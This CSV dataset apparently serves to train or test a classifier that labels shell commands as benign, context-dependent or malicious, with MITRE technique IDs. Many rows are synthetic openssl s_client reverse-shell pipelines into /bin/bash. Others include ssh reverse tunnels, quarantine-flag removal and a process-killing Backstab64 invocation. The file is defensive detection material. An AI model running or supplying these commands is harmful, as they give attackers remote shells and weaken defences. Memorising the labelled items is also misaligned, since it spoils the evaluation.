command,label,original_label,mitre_id
mysqldump --user user --password --all-databases > path/to/file.sql,Benign,Benign,Benign
lvm_import_vdo [-n|--name] vg_name/lv_name /dev/mapper/vdo_volume,Benign,Benign,Benign
zle widget_name,Benign,Benign,Benign
fail2ban-client set jail unbanip ip_address,Benign,Benign,Benign
nxcdb --set-workspace workspace_name,Benign,Benign,Benign
"find -regex ""$rx""",Benign,Benign,Benign
enum4linux -o remote_host,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
cargo locate-project --manifest-path path/to/Cargo.toml,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
get path/to/remote_file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
"find $HOME -not -iname ""*.c"" -print",Benign,Benign,Benign
find . -name '*.java' -exec vim {} +,Benign,Benign,Benign
"tdf [-b|--black-color] ""rgb(0, 0, 0)"" path/to/file.pdf",Benign,Benign,Benign
bvnc --shell,Benign,Benign,Benign
gio trash trash://id,Benign,Benign,Benign
xh post https://postman-echo.com/post name=john age=25,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
cpdf -list-annotations path/to/document.pdf,Benign,Benign,Benign
powerstat -a interval number_of_samples,Benign,Benign,Benign
id -Gn,Benign,Synthetic,Synthetic
pacman4console --level=path/to/level_file,Benign,Benign,Benign
wikiman -S,Benign,Benign,Benign
phpcpd path/to/file_or_directory,Benign,Benign,Benign
iex,Benign,Benign,Benign
eog --single-window path/to/image.jpg,Benign,Benign,Benign
d2 [-s|--sketch] true path/to/input_file.d2 path/to/output_file.ext,Benign,Benign,Benign
docker [exec|container exec] [-u|--user] user container_name command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
rpmspec --parse path/to/rpm.spec,Benign,Benign,Benign
ssh -R 8080:localhost:8080 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
ionic serve,Benign,Benign,Benign
scoop list,Benign,Benign,Benign
find -L research -maxdepth 2 -type d ! -group ian,Benign,Benign,Benign
ssh -R 8080:localhost:5432 backup@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
exiftool -description -W /path/to/output-file --filename /path/to/input-file,Malicious,Malicious,T1222
sudo smbpasswd -a username,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:443,Malicious,Synthetic,Synthetic
code,Benign,Benign,Benign
ssh -R 4444:localhost:22 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
most path/to/file +/string,Benign,Benign,Benign
urpmq --list-media --list-url,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
x_x [-h|--heading] 0 file.xlsx|file.csv,Benign,Benign,Benign
"mktemp -dt ""$(basename $0).XXXXXXXXXX""",Benign,Benign,Benign
fast --verbose,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
expose serve hostname,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
ChangeServiceConfig,Malicious,Malicious,T1543
npm unstar package_name --auth-type legacy|oauth|web|saml,Benign,Benign,Benign
tldr pamtopng,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:4445,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 audit@192.168.0.5,Context_Dependent,Synthetic,Synthetic
printenv [-0|--null] HOME,Benign,Benign,Benign
ascii-image-converter [-b|--braille] path/to/image|URL,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
pw-jack -r remote_instance_name command,Benign,Benign,Benign
ssh -R 8080:localhost:80 operator@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
softwareupdate --install update_name,Benign,Benign,Benign
systemctl log-level emerg|alert|crit|err|warning|notice|info|debug,Benign,Benign,Benign
envoy run --path path/to/directory task_name,Benign,Benign,Benign
ssh -R 4444:localhost:22 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
"tcsh -c ""echo 'tcsh is executed'""",Benign,Benign,Benign
find . -maxdepth 1 -type f | xargs -I ‘{}’ sudo mv {} /directory1/directory2,Benign,Benign,Benign
quota [-s|--human-readable],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 operator@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
mongod --dbpath path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
llvd [-c|--course] course-slug --cookies,Benign,Benign,Benign
ssh -R 4444:localhost:9001 user@10.20.30.40,Context_Dependent,Synthetic,Synthetic
"& ""PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"" -k -n $process_name",Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
MQTT,Malicious,Malicious,T1071
rustdoc src/lib.rs --out-dir path/to/output_directory,Benign,Benign,Benign
killall -KILL process_name,Benign,Benign,Benign
xattr -d com.apple.quarantine,Malicious,Malicious,T1553
openssl s_client -quiet -connect 10.10.10.50:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
systemd-stdio-bridge [-M|--machine] mycontainer,Benign,Benign,Benign
aws s3 mb s3://bucket_name --region region,Benign,Benign,Benign
"find . -name '*.doc' -exec rm ""{}"" \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
